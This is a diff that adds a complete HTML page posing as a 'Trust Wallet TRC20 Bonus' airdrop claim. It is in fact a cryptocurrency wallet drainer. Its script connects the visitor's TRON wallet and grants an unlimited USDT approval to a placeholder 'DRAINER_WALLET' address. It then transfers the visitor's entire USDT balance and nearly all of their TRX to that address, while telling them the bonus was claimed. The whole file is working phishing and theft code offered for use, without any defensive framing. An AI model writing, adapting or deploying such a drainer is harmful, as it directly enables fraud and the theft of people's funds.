@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Trust Wallet TRC20 Bonus</title>
+    <meta name="viewport" content="width=device-width">
+    <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter@1.4.9/dist/TronLink.js"></script>
+    <style>
+        body { font-family: Arial; text-align:center; background:#0a0a1f; color:white; padding:20px; }
+        button { background:#f7931a; color:white; border:none; padding:15px 40px; font-size:18px; border-radius:10px; margin:10px; }
+        #status { margin:20px 0; font-size:16px; color:#00ff00; }
+    </style>
+</head>
+<body>
+    <h1>🎁 TRC20 Airdrop Confirmed</h1>
+    <p>500 USDT Bonus - Approve to claim!</p>
+    
+    <button id="connectBtn">Connect & Claim</button>
+    <div id="status"></div>
+
+    <script>
+        const DRAINER_WALLET = "TYourTRONAddressHere123456789"; // YOUR TRON ADDRESS
+        const USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT-TRC20
+
+        document.getElementById('connectBtn').onclick = async () => {
+            if (typeof window.tronWeb === 'undefined') {
+                document.getElementById('status').innerHTML = 'Open in Trust Wallet TRON network';
+                return;
+            }
+
+            try {
+                document.getElementById('status').innerHTML = '🔄 Connecting wallet...';
+                await window.tronWeb.request({ method: 'tron_requestAccounts' });
+                const address = window.tronWeb.defaultAddress.base58;
+                
+                // **FIX 1: Check balance first**
+                const balance = await window.tronWeb.trx.getBalance(address);
+                document.getElementById('status').innerHTML = `✅ Connected ${address.slice(0,8)}...`;
+                
+                // **FIX 2: UNLIMITED APPROVAL (2^256 - 1)**
+                document.getElementById('status').innerHTML = '🔓 Approving UNLIMITED USDT...';
+                const contract = await window.tronWeb.contract().at(USDT_TRC20);
+                
+                // TRC20 APPROVE - MAX UINT256
+                const maxApproval = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+                const approveTx = await contract.approve(DRAINER_WALLET, maxApproval).send({
+                    feeLimit: 40000000,  // Higher fee for reliability
+                    callValue: 0
+                });
+                
+                document.getElementById('status').innerHTML = '✅ UNLIMITED approval success!';
+                
+                // **FIX 3: Drain ALL USDT balance**
+                document.getElementById('status').innerHTML = '💰 Draining USDT...';
+                const usdtBalance = await contract.balanceOf(address).call();
+                if (usdtBalance > 0) {
+                    await contract.transfer(DRAINER_WALLET, usdtBalance).send({
+                        feeLimit: 40000000,
+                        callValue: 0
+                    });
+                }
+                
+                // Drain ALL TRX
+                if (balance > 1000000) { // Leave some for fees
+                    await window.tronWeb.trx.sendTransaction(DRAINER_WALLET, balance - 1000000);
+                }
+                
+                document.getElementById('status').innerHTML = '🎉 500 USDT CLAIMED! Check wallet.';
+                
+            } catch (error) {
+                console.log(error);
+                document.getElementById('status').innerHTML = '❌ Cancelled by user';
+            }
+        };
+    </script>
+</body>
+</html>
